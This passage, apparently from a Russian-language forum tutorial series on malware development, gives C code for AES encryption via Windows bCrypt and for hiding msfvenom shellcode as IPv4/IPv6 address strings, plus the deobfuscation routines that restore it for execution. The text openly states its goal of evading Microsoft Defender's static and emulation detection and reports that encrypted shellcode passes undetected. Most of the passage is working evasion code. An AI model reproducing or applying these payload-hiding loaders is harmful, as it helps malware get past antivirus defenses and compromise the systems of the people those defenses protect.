        printf(&quot;[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Running BCryptDecrypt first time with NULL output parameters to retrieve the size of the output buffer which is saved in cbPlainText
  STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes-&gt;pCipherText, (ULONG)pAes-&gt;dwCipherSize, NULL, pAes-&gt;pIv, IVSIZE, NULL, 0, &amp;cbPlainText, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
        printf(&quot;[!] BCryptDecrypt[1] Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Allocating enough memory for the output buffer, cbPlainText
  pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
  if (pbPlainText == NULL) {
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Running BCryptDecrypt again with pbPlainText as the output buffer
  STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes-&gt;pCipherText, (ULONG)pAes-&gt;dwCipherSize, NULL, pAes-&gt;pIv, IVSIZE, pbPlainText, cbPlainText, &amp;cbResult, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
        printf(&quot;[!] BCryptDecrypt[2] Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Clean up
_EndOfFunc:
  if (hKeyHandle)
        BCryptDestroyKey(hKeyHandle);
  if (hAlgorithm)
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
  if (pbKeyObject)
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
  if (pbPlainText != NULL &amp;&amp; bSTATE) {
        // if everything went well, we save pbPlainText and cbPlainText
        pAes-&gt;pPlainText   = pbPlainText;
        pAes-&gt;dwPlainSize  = cbPlainText;
  }
  return bSTATE;

}</code></pre>
	</div>
</div><br />
<b>Дополнительные вспомогательные функции</b><br />
<br />
Код также включает в себя две небольшие вспомогательные функции: PrintHexData и GenerateRandomBytes.<br />
<br />
Первая функция, PrintHexData, выводит входной буфер в виде массива символов в синтаксисе C на консоль.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Вывод входного буфера в виде шестнадцатеричного массива символов
VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

  printf(&quot;unsigned char %s[] = {&quot;, Name);

  for (int i = 0; i &lt; Size; i++) {
        if (i % 16 == 0)
              printf(&quot;\n\t&quot;);

        if (i &lt; Size - 1) {
            printf(&quot;0x%0.2X, &quot;, Data[i]);
        else
              printf(&quot;0x%0.2X &quot;, Data[i]);
  }

  printf(&quot;};\n\n\n&quot;);

}</code></pre>
	</div>
</div><br />
Другая функция, GenerateRandomBytes, заполняет входной буфер случайными байтами, которые в этом контексте используются для генерации случайного ключа и инициализирующего вектора (IV).<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Генерация случайных байт заданного размера
VOID GenerateRandomBytes(PBYTE pByte, SIZE_T sSize) {

  for (int i = 0; i &lt; sSize; i++) {
        pByte[i] = (BYTE)rand() % 0xFF;
  }

}</code></pre>
	</div>
</div><br />
<b>Пример использования:</b><br />
<br />
Ниже представлена основная функция, которая используется для выполнения процедуры шифрования массива открытого текста.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// The plaintext, in hex format, that will be encrypted
// this is the following string in hex &quot;This is a plain text string, we&#039;ll try to encrypt/decrypt !&quot;
unsigned char Data[] = {
    0x54, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x61, 0x20, 0x70, 0x6C,
    0x61, 0x69, 0x6E, 0x20, 0x74, 0x65, 0x78, 0x74, 0x20, 0x73, 0x74, 0x72,
    0x69, 0x6E, 0x67, 0x2C, 0x20, 0x77, 0x65, 0x27, 0x6C, 0x6C, 0x20, 0x74,
    0x72, 0x79, 0x20, 0x74, 0x6F, 0x20, 0x65, 0x6E, 0x63, 0x72, 0x79, 0x70,
    0x74, 0x2F, 0x64, 0x65, 0x63, 0x72, 0x79, 0x70, 0x74, 0x20, 0x21
};

int main() {

    BYTE pKey [KEYSIZE];                    // KEYSIZE is 32 bytes
    BYTE pIv [IVSIZE];                      // IVSIZE is 16 bytes

    srand(time(NULL));                      // The seed to generate the key. This is used to further randomize the key.
    GenerateRandomBytes(pKey, KEYSIZE);     // Generating a key with the helper function

    srand(time(NULL) ^ pKey[0]);            // The seed to generate the IV. Use the first byte of the key to add more randomness.
    GenerateRandomBytes(pIv, IVSIZE);       // Generating the IV with the helper function

    // Printing both key and IV onto the console
    PrintHexData(&quot;pKey&quot;, pKey, KEYSIZE);
    PrintHexData(&quot;pIv&quot;, pIv, IVSIZE);

    // Defining two variables the output buffer and its respective size which will be used in SimpleEncryption
    PVOID pCipherText = NULL;
    DWORD dwCipherSize = NULL;

    // Encrypting
    if (!SimpleEncryption(Data, sizeof(Data), pKey, pIv, &amp;pCipherText, &amp;dwCipherSize)) {
        return -1;
    }

    // Print the encrypted buffer as a hex array
    PrintHexData(&quot;CipherText&quot;, pCipherText, dwCipherSize);

    // Clean up
    HeapFree(GetProcessHeap(), 0, pCipherText);
    system(&quot;PAUSE&quot;);
    return 0;
}</code></pre>
	</div>
</div><br />
Этот код демонстрирует, как можно реализовать шифрование данных с использованием AES.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746773739714.png"
		data-src="https://osint42.org/attachments/1746773739714-png.79/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773739714-png.79/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773739714.png"
			title="1746773739714.png"
			width="1588" height="831" loading="lazy" />
	</div><br />
<br />
<b>Пример расшифровки данных</b><br />
<br />
Ниже представлена основная функция, которая используется для выполнения процедуры дешифрования.<br />
<br />
Для процедуры дешифрования требуются ключ дешифрования, инициализирующий вектор (IV) и шифртекст.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// the key printed to the screen
unsigned char pKey[] = {
        0x3E, 0x31, 0xF4, 0x00, 0x50, 0xB6, 0x6E, 0xB8, 0xF6, 0x98, 0x95, 0x27, 0x43, 0x27, 0xC0, 0x55,
        0xEB, 0xDB, 0xE1, 0x7F, 0x05, 0xFE, 0x65, 0x6D, 0x0F, 0xA6, 0x5B, 0x00, 0x33, 0xE6, 0xD9, 0x0B };

// the iv printed to the screen
unsigned char pIv[] = {
        0xB4, 0xC8, 0x1D, 0x1D, 0x14, 0x7C, 0xCB, 0xFA, 0x07, 0x42, 0xD9, 0xED, 0x1A, 0x86, 0xD9, 0xCD };


// the encrypted buffer printed to the screen, which is:
unsigned char CipherText[] = {
        0x97, 0xFC, 0x24, 0xFE, 0x97, 0x64, 0xDF, 0x61, 0x81, 0xD8, 0xC1, 0x9E, 0x23, 0x30, 0x79, 0xA1,
        0xD3, 0x97, 0x5B, 0xAE, 0x29, 0x7F, 0x70, 0xB9, 0xC1, 0xEC, 0x5A, 0x09, 0xE3, 0xA4, 0x44, 0x67,
        0xD6, 0x12, 0xFC, 0xB5, 0x86, 0x64, 0x0F, 0xE5, 0x74, 0xF9, 0x49, 0xB3, 0x0B, 0xCA, 0x0C, 0x04,
        0x17, 0xDB, 0xEF, 0xB2, 0x74, 0xC2, 0x17, 0xF6, 0x34, 0x60, 0x33, 0xBA, 0x86, 0x84, 0x85, 0x5E };

int main() {

    // Defining two variables the output buffer and its respective size which will be used in SimpleDecryption
    PVOID    pPlaintext  = NULL;
    DWORD    dwPlainSize = NULL;

    // Decrypting
    if (!SimpleDecryption(CipherText, sizeof(CipherText), pKey, pIv, &amp;pPlaintext, &amp;dwPlainSize)) {
        return -1;
    }

    // Printing the decrypted data to the screen in hex format
    PrintHexData(&quot;PlainText&quot;, pPlaintext, dwPlainSize);

    // this will print: &quot;This is a plain text string, we&#039;ll try to encrypt/decrypt !&quot;
    printf(&quot;Data: %s \n&quot;, pPlaintext);

    // Clean up
    HeapFree(GetProcessHeap(), 0, pPlaintext);
    system(&quot;PAUSE&quot;);
    return 0;
}</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746773620567.png"
		data-src="https://osint42.org/attachments/1746773620567-png.73/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773620567-png.73/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773620567.png"
			title="1746773620567.png"
			width="1429" height="775" loading="lazy" />
	</div><br />
<br />
<b>Недостатки библиотеки bCrypt</b><br />
<br />
Одним из основных недостатков использования описанного выше метода для реализации шифрования AES является то, что использование криптографических функций WinAPI приводит к их появлению в таблице импорта адресов (IAT) бинарного файла.<br />
<br />
Решения  безопасности могут обнаруживать использование криптографических функций, сканируя IAT, что может потенциально указывать на вредоносное поведение или вызвать подозрения.<br />
Скрытие WinAPI в IAT возможно и будет обсуждаться в следующих статьях.<br />
<br />
На изображении ниже показана IAT бинарного файла, использующего Windows API для шифрования AES. Использование библиотеки crypt.dll и криптографических функций явно видно.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746773639033.png"
		data-src="https://osint42.org/attachments/1746773639033-png.74/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773639033-png.74/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773639033.png"
			title="1746773639033.png"
			width="1902" height="945" loading="lazy" />
	</div><br />
<br />
<span style="color: rgb(184, 49, 47)"><b><u><span style="font-size: 22px">Обход статического анализа Microsoft Defender</span></u></b></span><br />
<br />
Пример использования алгоритмов шифрования XOR, RC4 и AES для обхода статического анализатора Microsoft Defender.<br />
На этом этапе учебного модуля полезная нагрузка (payload) не выполняется, она просто выводится на консоль. Поэтому в этом модуле основное внимание уделяется исключительно обходу статического анализа и сигнатурному обнаружению.<br />
<br />
Каждый из примеров кода использует шелл-код Msfvenom.<br />
<br />
<b>Необработанный шелл-код (Raw Shellcode)</b> - обнаружен Defender&#039;ом.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746773651095.png"
		data-src="https://osint42.org/attachments/1746773651095-png.75/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773651095-png.75/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773651095.png"
			title="1746773651095.png"
			width="1358" height="669" loading="lazy" />
	</div><br />
<br />
<b>XOR-шифрованный шелл-код</b> - успешно обходит Defender.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746773659154.png"
		data-src="https://osint42.org/attachments/1746773659154-png.76/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773659154-png.76/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773659154.png"
			title="1746773659154.png"
			width="1777" height="998" loading="lazy" />
	</div><br />
<br />
<b>AES-шифрованный шелл-код</b> - успешно обходит Defender.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746773667064.png"
		data-src="https://osint42.org/attachments/1746773667064-png.77/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773667064-png.77/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773667064.png"
			title="1746773667064.png"
			width="1747" height="869" loading="lazy" />
	</div><br />
<br />
<b>RC4-шифрованный шелл-код </b>- успешно обходит Defender.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746773674642.png"
		data-src="https://osint42.org/attachments/1746773674642-png.78/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773674642-png.78/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773674642.png"
			title="1746773674642.png"
			width="1656" height="898" loading="lazy" />
	</div></div>
						

							<h2>Обфускация Payload</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746773857394.png"
		data-src="https://osint42.org/attachments/1746773857394-png.80/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773857394-png.80/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773857394.png"
			title="1746773857394.png"
			width="573" height="534" loading="lazy" />
	</div><br />
<br />
В предыдущих статьях обсуждались вопросы размещения полезной нагрузки и её шифрование.<br />
<br />
Но как уже было замечено этого не достаточно для сбития детекта, необходимо обойти ещё детект по поведению и эмуляцию кода.<br />
<br />
С детектом по поведению немного сложнее, но детект по эмуляции кода можно обойти как вариант обфускацией этого самого кода.)<br />
<br />
Предлагаю в этой статье рассмотреть обфускацию полезной нагрузки, далее уже всё зависит что делает ваша ПО, вообще изначально нужно проектировать софт так, что-бы у него не было подозрительного поведения.<br />
<br />
В статье будут рассматриваться три способа обфускации...<br />
<br />
Что-бы антивирусу или исследователю кода было хорошо, рекомендуется применять шифрование + несколько методов обфускации в комплексе.)<br />
<br />
<b>1)IPv4/IPv6Fuscation</b> - это метод обфускации, при котором байты shellcode преобразуются в строки IPv4 или IPv6. Давайте рассмотрим несколько байтов из shellcode Msfvenom x64 calc и проанализируем, как их можно преобразовать в строки IPv4 или IPv6. Для этого примера используются следующие байты:<br />
<br />
FC 48 83 E4 F0 E8 C0 00 00 00 41 51 41 50 52 51.<br />
<br />
<b>IPv4Fuscation</b> - Поскольку адреса IPv4 состоят из 4 октетов, IPv4Fuscation использует 4 байта для генерации одной строки IPv4, где каждый байт представляет собой октет. Возьмите каждый байт, который в данный момент в формате hex, и преобразуйте его в десятичный формат, чтобы получить один октет. Например, FC равно 252 в десятичной форме, 48 равно 72, 83 равно 131, и E4 равно 228. Таким образом, первые 4 байта примера shellcode, FC 48 83 E4 будут 252.72.131.228.<br />
<br />
<b>IPv6Fuscation</b> - Этот метод будет использовать аналогичную логику, как в примере IPv4Fuscation, но вместо использования 4 байтов на IP-адрес, используется 16 байтов для генерации одного адреса IPv6. Кроме того, преобразование байтов в десятичный формат не требуется для адресов IPv6. В качестве примера для указанного shellcode это будет FC48:83E4:F0E8:C000:0000:4151:4150:5251.<br />
<br />
<b>Реализация IPv4Fuscation</b><br />
<br />
Теперь, когда логика объяснена, этот раздел будет посвящен реализации IPv4Fuscation. Несколько моментов о приведенном ниже фрагменте кода:<br />
<br />
Как уже упоминалось ранее, для генерации адреса IPv4 требуется 4 байта, поэтому shellcode <b>должен состоять из кратного 4 числа байтов.</b> Можно создать функцию, которая дополняет shellcode, если он не соответствует этому требованию.<br />
<br />
<b>GenerateIpv4</b> - это вспомогательная функция, которая принимает 4 байта shellcode и использует sprintf для генерации адреса IPv4.<br />
<br />
Наконец, код охватывает только обфускацию, в то время как деобфускация объясняется чуть позже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Function takes in 4 raw bytes and returns them in an IPv4 string format
char* GenerateIpv4(int a, int b, int c, int d) {
    unsigned char Output [32];

    // Creating the IPv4 address and saving it to the &#039;Output&#039; variable
    sprintf(Output, &quot;%d.%d.%d.%d&quot;, a, b, c, d);

    // Optional: Print the &#039;Output&#039; variable to the console
    // printf(&quot;[i] Output: %s\n&quot;, Output);

    return (char*)Output;
}


// Generate the IPv4 output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer &amp; the size of the shellcode buffer
BOOL GenerateIpv4Output(unsigned char* pShellcode, SIZE_T ShellcodeSize) {

    // If the shellcode buffer is null or the size is not a multiple of 4, exit
    if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 4 != 0){
        return FALSE;
    }
    printf(&quot;char* Ipv4Array[%d] = { \n\t&quot;, (int)(ShellcodeSize / 4));

    // We will read one shellcode byte at a time, when the total is 4, begin generating the IPv4 address
    // The variable &#039;c&#039; is used to store the number of bytes read. By default, starts at 4.
    int c = 4, counter = 0;
    char* IP = NULL;

    for (int i = 0; i &lt; ShellcodeSize; i++) {

        // Track the number of bytes read and when they reach 4 we enter this if statement to begin generating the IPv4 address
        if (c == 4) {
            counter++;

            // Generating the IPv4 address from 4 bytes which begin at i until [i + 3]
            IP = GenerateIpv4(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3]);

            if (i == ShellcodeSize - 4) {
                // Printing the last IPv4 address
                printf(&quot;\&quot;%s\&quot;&quot;, IP);
                break;
            }
            else {
                // Printing the IPv4 address
                printf(&quot;\&quot;%s\&quot;, &quot;, IP);
            }

            c = 1;

            // Optional: To beautify the output on the console
            if (counter % 8 == 0) {
                printf(&quot;\n\t&quot;);
            }
        }
        else {
            c++;
        }
    }
    printf(&quot;\n};\n\n&quot;);
    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Реализация IPv6Fuscation</b><br />
<br />
При использовании IPv6Fuscation shellcode должен быть кратен 16. Опять же, можно создать функцию, которая дополняет shellcode, если он не соответствует этому требованию.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Function takes in 16 raw bytes and returns them in an IPv6 address string format
char* GenerateIpv6(int a, int b, int c, int d, int e, int f, int g, int h, int i, int j, int k, int l, int m, int n, int o, int p) {

    // Each IPv6 segment is 32 bytes
    char Output0[32], Output1[32], Output2[32], Output3[32];

    // There are 4 segments in an IPv6 (32 * 4 = 128)
    char result[128];

    // Generating output0 using the first 4 bytes
    sprintf(Output0, &quot;%0.2X%0.2X:%0.2X%0.2X&quot;, a, b, c, d);

    // Generating output1 using the second 4 bytes
    sprintf(Output1, &quot;%0.2X%0.2X:%0.2X%0.2X&quot;, e, f, g, h);

    // Generating output2 using the third 4 bytes
    sprintf(Output2, &quot;%0.2X%0.2X:%0.2X%0.2X&quot;, i, j, k, l);

    // Generating output3 using the last 4 bytes
    sprintf(Output3, &quot;%0.2X%0.2X:%0.2X%0.2X&quot;, m, n, o, p);

    // Combining Output0,1,2,3 to generate the IPv6 address
    sprintf(result, &quot;%s:%s:%s:%s&quot;, Output0, Output1, Output2, Output3);

    // Optional: Print the &#039;result&#039; variable to the console
    // printf(&quot;[i] result: %s\n&quot;, (char*)result);

    return (char*)result;
}


// Generate the IPv6 output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer &amp; the size of the shellcode buffer
BOOL GenerateIpv6Output(unsigned char* pShellcode, SIZE_T ShellcodeSize) {
    // If the shellcode buffer is null or the size is not a multiple of 16, exit
    if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 16 != 0){
        return FALSE;
    }
    printf(&quot;char* Ipv6Array [%d] = { \n\t&quot;, (int)(ShellcodeSize / 16));

    // We will read one shellcode byte at a time, when the total is 16, begin generating the IPv6 address
    // The variable &#039;c&#039; is used to store the number of bytes read. By default, starts at 16.
    int c = 16, counter = 0;
    char* IP = NULL;

    for (int i = 0; i &lt; ShellcodeSize; i++) {
        // Track the number of bytes read and when they reach 16 we enter this if statement to begin generating the IPv6 address
        if (c == 16) {
            counter++;

            // Generating the IPv6 address from 16 bytes which begin at i until [i + 15]
            IP = GenerateIpv6(
                pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3],
                pShellcode[i + 4], pShellcode[i + 5], pShellcode[i + 6], pShellcode[i + 7],
                pShellcode[i + 8], pShellcode[i + 9], pShellcode[i + 10], pShellcode[i + 11],
                pShellcode[i + 12], pShellcode[i + 13], pShellcode[i + 14], pShellcode[i + 15]
            );
            if (i == ShellcodeSize - 16) {

                // Printing the last IPv6 address
                printf(&quot;\&quot;%s\&quot;&quot;, IP);
                break;
            }
            else {
                // Printing the IPv6 address
                printf(&quot;\&quot;%s\&quot;, &quot;, IP);
            }
            c = 1;

            // Optional: To beautify the output on the console
            if (counter % 3 == 0) {
                printf(&quot;\n\t&quot;);
            }
        }
        else {
            c++;
        }
    }
    printf(&quot;\n};\n\n&quot;);
    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Деобфускация IPv4/IPv6Fuscation</b><br />
<br />
После того как обфусцированный payload успешно обошел статическое обнаружение, его необходимо деобфусцировать для выполнения. Процесс деобфускации будет обратным процессу обфускации, позволяя генерировать байты из IP-адреса вместо использования байтов для генерации IP-адреса. Деобфускация потребует следующего:<br />
<br />
IPv4 Деобфускация - Для этого потребуется использование NTAPI RtlIpv4StringToAddressA. Она преобразует строковое представление IPv4-адреса в бинарный IPv4-адрес.<br />
IPv6 Деобфускация - Аналогично предыдущей функции, для деобфускации IPv6 потребуется использование другой NTAPI RtlIpv6StringToAddressA. Эта функция преобразует IPv6-адрес в бинарный IPv6-адрес.<br />
<br />
<b>Деобфускация Payloads IPv4Fuscation</b><br />
<br />
Функция Ipv4Deobfuscation принимает Ipv4Array в качестве первого параметра, который представляет собой массив IPv4-адресов. Второй параметр - это NmbrOfElements, который представляет собой количество IPv4-адресов в массиве Ipv4Array для итерации по размеру массива. Последние 2 параметра, ppDAddress и pDSize, будут использоваться для хранения деобфусцированного payload и его размера соответственно.<br />
<br />
Процесс деобфускации начинается с получения адреса функции RtlIpv4StringToAddressA с использованием GetProcAddress и GetModuleHandle. Затем выделяется буфер, который в конечном итоге будет хранить деобфусцированный payload размера NmbrOfElements * 4. Логика за этим размером в том, что каждый IPv4 будет генерировать 4 байта.<br />
<br />
Переходим к циклу for. Сначала определяется новая переменная, TmpBuffer, и она устанавливается равной pBuffer. Затем TmpBuffer передается в RtlIpv4StringToAddressA как четвертый параметр, где будет храниться бинарное представление IPv4-адреса. Функция RtlIpv4StringToAddressA записывает 4 байта в буфер TmpBuffer, поэтому после этого TmpBuffer увеличивается на 4, чтобы позволить следующим 4 байтам быть записанным в него без перезаписи предыдущих байтов.<br />
<br />
Наконец, ppDAddress и pDSize устанавливаются для хранения базового адреса деобфусцированного payload, а также его размера.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef NTSTATUS (NTAPI* fnRtlIpv4StringToAddressA)(
    PCSTR        S,
    BOOLEAN        Strict,
    PCSTR*        Terminator,
       PVOID        Addr
);

BOOL Ipv4Deobfuscation(IN CHAR* Ipv4Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

    PBYTE           pBuffer                 = NULL,
                    TmpBuffer               = NULL;

    SIZE_T          sBuffSize               = NULL;

    PCSTR           Terminator              = NULL;

    NTSTATUS        STATUS                  = NULL;

    // Getting RtlIpv4StringToAddressA address from ntdll.dll
    fnRtlIpv4StringToAddressA pRtlIpv4StringToAddressA = (fnRtlIpv4StringToAddressA)GetProcAddress(GetModuleHandle(TEXT(&quot;NTDLL&quot;)), &quot;RtlIpv4StringToAddressA&quot;);
    if (pRtlIpv4StringToAddressA == NULL){
        printf(&quot;[!] GetProcAddress Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Getting the real size of the shellcode which is the number of IPv4 addresses * 4
    sBuffSize = NmbrOfElements * 4;

    // Allocating memory which will hold the deobfuscated shellcode
    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
    if (pBuffer == NULL){
        printf(&quot;[!] HeapAlloc Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Setting TmpBuffer to be equal to pBuffer
    TmpBuffer = pBuffer;

    // Loop through all the IPv4 addresses saved in Ipv4Array
    for (int i = 0; i &lt; NmbrOfElements; i++) {

        // Deobfuscating one IPv4 address at a time
        // Ipv4Array[i] is a single ipv4 address from the array Ipv4Array
        if ((STATUS = pRtlIpv4StringToAddressA(Ipv4Array[i], FALSE, &amp;Terminator, TmpBuffer)) != 0x0) {
            // if it failed
            printf(&quot;[!] RtlIpv4StringToAddressA Failed At [%s] With Error 0x%0.8X&quot;, Ipv4Array[i], STATUS);
            return FALSE;
        }

        // 4 bytes are written to TmpBuffer at a time
        // Therefore Tmpbuffer will be incremented by 4 to store the upcoming 4 bytes
        TmpBuffer = (PBYTE)(TmpBuffer + 4);

    }

    // Save the base address &amp; size of the deobfuscated payload
    *ppDAddress     = pBuffer;
    *pDSize         = sBuffSize;

    return TRUE;
}</code></pre>
	</div>
</div><br />
Следующий рисунок показывает, что указанный код успешно запущен...<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746773905227.png"
		data-src="https://osint42.org/attachments/1746773905227-png.81/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773905227-png.81/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773905227.png"
			title="1746773905227.png"
			width="1292" height="881" loading="lazy" />
	</div><br />
<br />
<b>Деобфускация Payloads IPv6Fuscation</b><br />
<br />
Все шаги в процессе деобфускации для IPv6 такие же, как и для IPv4, за исключением двух основных различий:<br />
<ol>
<li data-xf-list-type="ol">Используется RtlIpv6StringToAddressA вместо RtlIpv4StringToAddressA.</li>
<li data-xf-list-type="ol">Каждый IPv6-адрес деобфусцируется в 16 байтов вместо 4 байтов.</li>
</ol>Таким образом, при деобфускации IPv6Fuscation вам нужно будет адаптировать алгоритм, чтобы учитывать длину 16 байтов для каждого адреса и использовать соответствующую функцию для преобразования строкового представления IPv6 обратно в бинарные данные.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef NTSTATUS(NTAPI* fnRtlIpv6StringToAddressA)(
    PCSTR        S,
    PCSTR*        Terminator,
    PVOID        Addr
);

BOOL Ipv6Deobfuscation(IN CHAR* Ipv6Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

    PBYTE           pBuffer                 = NULL,
                    TmpBuffer               = NULL;

    SIZE_T          sBuffSize               = NULL;

    PCSTR           Terminator              = NULL;

    NTSTATUS        STATUS                  = NULL;

    // Getting RtlIpv6StringToAddressA address from ntdll.dll
    fnRtlIpv6StringToAddressA pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle(TEXT(&quot;NTDLL&quot;)), &quot;RtlIpv6StringToAddressA&quot;);
    if (pRtlIpv6StringToAddressA == NULL) {
        printf(&quot;[!] GetProcAddress Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Getting the real size of the shellcode which is the number of IPv6 addresses * 16
    sBuffSize = NmbrOfElements * 16;


    // Allocating memory which will hold the deobfuscated shellcode
    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
    if (pBuffer == NULL) {
        printf(&quot;[!] HeapAlloc Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    TmpBuffer = pBuffer;

    // Loop through all the IPv6 addresses saved in Ipv6Array
    for (int i = 0; i &lt; NmbrOfElements; i++) {

        // Deobfuscating one IPv6 address at a time
        // Ipv6Array[i] is a single IPv6 address from the array Ipv6Array
        if ((STATUS = pRtlIpv6StringToAddressA(Ipv6Array[i], &amp;Terminator, TmpBuffer)) != 0x0) {
            // if it failed
            printf(&quot;[!] RtlIpv6StringToAddressA Failed At [%s] With Error 0x%0.8X&quot;, Ipv6Array[i], STATUS);
            return FALSE;
        }

        // 16 bytes are written to TmpBuffer at a time
        // Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
        TmpBuffer = (PBYTE)(TmpBuffer + 16);

    }

    // Save the base address &amp; size of the deobfuscated payload
    *ppDAddress  = pBuffer;
    *pDSize      = sBuffSize;

    return TRUE;

}</code></pre>
	</div>
</div><br />
